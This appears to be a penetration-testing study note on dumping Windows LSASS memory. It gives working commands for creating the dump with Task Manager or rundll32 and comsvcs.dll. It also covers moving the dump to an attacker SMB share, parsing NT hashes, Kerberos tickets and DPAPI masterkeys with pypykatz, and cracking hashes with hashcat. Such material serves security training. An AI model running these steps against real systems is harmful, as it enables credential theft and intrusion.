

## Role of LSASS

- Caches credentials in memory
    
- Creates access tokens
    
- Enforces security policies
    
- Writes security logs
    

Accessing **LSASS memory** → reveals hashes, tickets, and possibly plaintext passwords.

---

## Dumping LSASS Memory

### Method 1 – Task Manager (GUI)

1. Open Task Manager
    
2. Processes → `lsass.exe`
    
3. Right-click → **Create Dump File**
    
4. Dump saved at:
    
    ```
    C:\Users\<user>\AppData\Local\Temp\lsass.DMP
    ```
    
5. Transfer file to attacker (e.g., SMB).
    

---

### Method 2 – Rundll32 & Comsvcs.dll (CLI)

**Step 1: Find LSASS PID**

```
tasklist /svc
Get-Process lsass   # PowerShell
```

Example:

```
lsass.exe   672   KeyIso, SamSs, VaultSvc
```

**Step 2: Dump LSASS**

```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

**Step 3: Transfer File**  
On attacker (SMB server):

```
python3 impacket-smbserver share . -smb2support
```

On target:

```
move lsass.dmp \\10.10.15.16\CompData
```

---

## Parsing LSASS Dump with Pypykatz

Run:

```
pypykatz lsa minidump /home/user/lsass.dmp
```

### Example Output

**MSV (MSV1_0)** – NT Hashes

```
Username: bob
Domain: DESKTOP-33E7O54
NT Hash: 64f12cddaa88057e06a81b54e73b949b
```

**WDIGEST** – may reveal plaintext if enabled (disabled on modern Windows).

```
username: bob
password: None
```

**Kerberos** – tickets, creds, encryption keys.

**DPAPI** – masterkeys for decrypting protected data.

```
key_guid: 3e1d1091-b792-45df-ab8e-c66af044d69b
masterkey: e8bc2f...f195fba92
```

---

## Cracking NT Hashes (Hashcat)

Example:

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

Result:

```
64f12cddaa88057e06a81b54e73b949b:Password1
```

---

## Key Points

- Dump LSASS with Task Manager or Rundll32.
    
- Transfer dump safely to attacker machine.
    
- Use **Pypykatz** to parse offline.
    
- Focus on **NT hashes** for cracking.
    
- Check for Kerberos tickets & DPAPI masterkeys for further exploitation.
    

